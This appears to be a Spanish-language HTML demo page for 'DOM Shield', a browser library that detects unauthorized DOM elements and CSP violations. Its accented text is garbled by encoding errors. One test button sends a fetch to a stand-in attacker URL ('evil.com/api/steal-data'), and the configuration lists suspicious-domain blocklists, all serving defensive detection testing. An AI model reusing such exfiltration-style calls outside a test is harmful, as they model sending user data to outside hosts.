<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üõ°Ô∏è DOM Shield Demo - Casos Espec√≠ficos</title>
    <link rel="stylesheet" href="styles.css">
    <meta http-equiv="Content-Security-Policy-Report-Only" content="default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-src 'self'; report-uri /dom-shield-report;">
</head>
<body>
    <div class="container">
        <h1>üõ°Ô∏è DOM Shield Demo</h1>
        <p class="subtitle">Casos de Uso Espec√≠ficos - Solo 2 Pruebas</p>
        
        <!-- Status Panel -->
        <div class="status-panel">
            <h3>üìä Estado del Sistema</h3>
            <p><strong>DOM Shield:</strong> <span id="shield-status">Inicializando...</span></p>
            <p><strong>Endpoint API:</strong> <span id="api-endpoint">/dom-shield-report</span></p>
        </div>

        <!-- Test Cases -->
        <div class="demo-section">
            <h2>üß™ Casos de Prueba Espec√≠ficos</h2>
            <p>Estos son los √∫nicos 2 casos que necesitas probar:</p>
            
            <div class="test-case">
                <h3>1. Elemento No Permitido en Live (.dynamic-content)</h3>
                <p>Prueba la detecci√≥n de elementos sospechosos a√±adidos din√°micamente al contenedor .dynamic-content</p>
                <button onclick="testUnauthorizedElement()" class="test-button">
                    üö´ A√±adir Elemento No Permitido
                </button>
            </div>

            <div class="test-case">
                <h3>2. Fetch No Permitido</h3>
                <p>Prueba la detecci√≥n de peticiones HTTP a dominios no autorizados</p>
                <button onclick="testUnauthorizedFetch()" class="test-button">
                    üö´ Hacer Fetch No Permitido
                </button>
            </div>
        </div>

        <!-- Dynamic Content Container -->
        <div class="content-area">
            <h3>üì¶ Contenedor de Contenido Din√°mico</h3>
            <p>Los elementos a√±adidos aqu√≠ ser√°n detectados autom√°ticamente:</p>
            <div class="dynamic-content" id="dynamic-container" style="padding: 15px; background: #f8f9fa; border: 2px dashed #dee2e6; border-radius: 8px; min-height: 100px;">
                <p><em>Contenedor vac√≠o - Los elementos a√±adidos aqu√≠ ser√°n monitoreados</em></p>
            </div>
        </div>

        <!-- Instructions -->
        <div class="demo-instructions">
            <h3>üìã Instrucciones</h3>
            <ol>
                <li>Abre las <strong>DevTools</strong> (F12) y ve a la pesta√±a <strong>Console</strong></li>
                <li>Haz clic en los botones de prueba</li>
                <li>Observa los <strong>logs de la librer√≠a</strong> en la consola</li>
                <li>Verifica las <strong>llamadas al endpoint</strong> en la pesta√±a Network</li>
            </ol>
        </div>

        <!-- Version Info -->
        <div class="version-info">
            <p>üõ°Ô∏è DOM Shield v1.0.0 | Demo Simplificado | Endpoint: /dom-shield-report</p>
        </div>
    </div>

    <!-- Load DOM Shield Library -->
    <script src="dom-shield.umd.js"></script>
    
    <script>
        // Global variables
        let cspSentinel = null;
        let domSentinel = null;
        let isInitialized = false;

        // Update status display
        function updateStatus() {
            document.getElementById('shield-status').textContent = isInitialized ? 'Activo' : 'Inicializando...';
        }

        // Initialize DOM Shield automatically
        async function initializeDOMShield() {
            try {
                console.log('üöÄ Iniciando DOM Shield...');
                console.log('üîç DOMShield object:', DOMShield);
                console.log('üîç DOMShield.init:', typeof DOMShield.init);
                
                const config = {
                    csp: {
                        endpoint: '/dom-shield-report',
                        enable: true,
                        runAnalysis: true,
                        directives: [
                            "default-src 'self'",
                            "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
                            "style-src 'self' 'unsafe-inline'",
                            "img-src 'self' data:",
                            "connect-src 'self'",
                            "frame-src 'self'"
                        ],
                        domains: ['malicious.com', 'evil.org', 'suspicious.net']
                    },
                    integrity: {
                        selectors: ['script[src*="evil.com"]', 'iframe[src*="malicious.org"]', '.suspicious-element'],
                        suspiciousDomains: ['evil.com', 'malicious.org', 'phish.com'],
                        liveSelectors: ['.dynamic-content']
                    }
                };

                console.log('üìã Configuraci√≥n:', config);
                console.log('üîÑ Llamando a DOMShield.init...');
                
                await DOMShield.init(config);
                
                console.log('üîÑ Obteniendo sentinels...');
                cspSentinel = DOMShield.getCSPSentinel();
                domSentinel = DOMShield.getDOMSentinel();
                isInitialized = true;
                
                updateStatus();
                console.log('‚úÖ DOM Shield inicializado y activo');
                console.log('CSP Sentinel:', cspSentinel);
                console.log('DOM Sentinel:', domSentinel);
                
            } catch (error) {
                console.error('‚ùå Error al inicializar DOM Shield:', error);
                console.error('‚ùå Stack trace:', error.stack);
                updateStatus();
            }
        }

        // TEST CASE 1: Unauthorized Element in Live (.dynamic-content)
        function testUnauthorizedElement() {
            console.log('üö´ CASO 1: A√±adiendo elemento no permitido a .dynamic-content...');
            
            // Create a suspicious element that should be detected by the library
            const suspiciousElement = document.createElement('div');
            suspiciousElement.className = 'suspicious-element';
            suspiciousElement.innerHTML = '<strong>‚ö†Ô∏è ELEMENTO SOSPECHOSO DETECTADO</strong><br>Este elemento fue a√±adido din√°micamente y deber√≠a ser detectado por la librer√≠a';
            suspiciousElement.style.cssText = 'background: #ff6b6b; color: white; padding: 15px; margin: 10px 0; border-radius: 8px; border: 2px solid #ff5252;';
            
            // Add to the dynamic content container - the library should detect this automatically
            const dynamicContainer = document.getElementById('dynamic-container');
            dynamicContainer.appendChild(suspiciousElement);
            
            console.log('‚úÖ Elemento a√±adido - La librer√≠a deber√≠a detectarlo autom√°ticamente');
        }

        // TEST CASE 2: Unauthorized Fetch Request
        function testUnauthorizedFetch() {
            console.log('üö´ CASO 2: Intentando fetch no permitido...');
            
            // Try to make a fetch to an unauthorized domain - CSP should block this and the library should detect it
            fetch('https://evil.com/api/steal-data')
                .then(response => {
                    console.log('‚ö†Ô∏è Fetch exitoso (inesperado):', response);
                })
                .catch(error => {
                    console.log('‚úÖ Fetch bloqueado por CSP (esperado):', error.message);
                });
            
            console.log('‚úÖ Petici√≥n fetch enviada - La librer√≠a deber√≠a detectar la violaci√≥n autom√°ticamente');
        }

        // Initialize on page load
        document.addEventListener('DOMContentLoaded', function() {
            console.log('üü¢ DOM Content Loaded');
            updateStatus();
            
            // Funci√≥n para verificar si DOMShield est√° disponible
            function waitForDOMShield() {
                console.log('üîç Verificando disponibilidad de DOMShield...');
                console.log('typeof DOMShield:', typeof DOMShield);
                console.log('window.DOMShield:', window.DOMShield);
                console.log('globalThis.DOMShield:', globalThis.DOMShield);
                
                if (typeof DOMShield !== 'undefined') {
                    console.log('‚úÖ DOMShield detectado, iniciando...');
                    initializeDOMShield();
                } else {
                    console.log('‚è≥ Esperando a que DOMShield se cargue...');
                    setTimeout(waitForDOMShield, 100);
                }
            }
            
            // Esperar a que el script UMD se cargue completamente
            setTimeout(waitForDOMShield, 100);
        });

        // Add CSS for test cases
        const style = document.createElement('style');
        style.textContent = `
            .test-case {
                background: #f8f9fa;
                border: 1px solid #e9ecef;
                border-radius: 8px;
                padding: 20px;
                margin: 15px 0;
            }
            .test-case h3 {
                color: #495057;
                margin: 0 0 10px 0;
            }
            .test-button {
                background: #dc3545;
                color: white;
                border: none;
                padding: 12px 24px;
                border-radius: 6px;
                cursor: pointer;
                font-size: 16px;
                font-weight: bold;
                margin: 10px 0;
                transition: background-color 0.3s;
            }
            .test-button:hover {
                background: #c82333;
            }
            .demo-instructions {
                background: #e3f2fd;
                border: 1px solid #bbdefb;
                border-radius: 8px;
                padding: 20px;
                margin: 20px 0;
            }
            .demo-instructions ol {
                margin: 10px 0;
                padding-left: 20px;
            }
            .demo-instructions li {
                margin: 8px 0;
                line-height: 1.5;
            }
        `;
        document.head.appendChild(style);

        console.log('‚úÖ Script cargado correctamente');
        console.log('DOMShield disponible al cargar:', typeof DOMShield);
    </script>
</body>
</html>
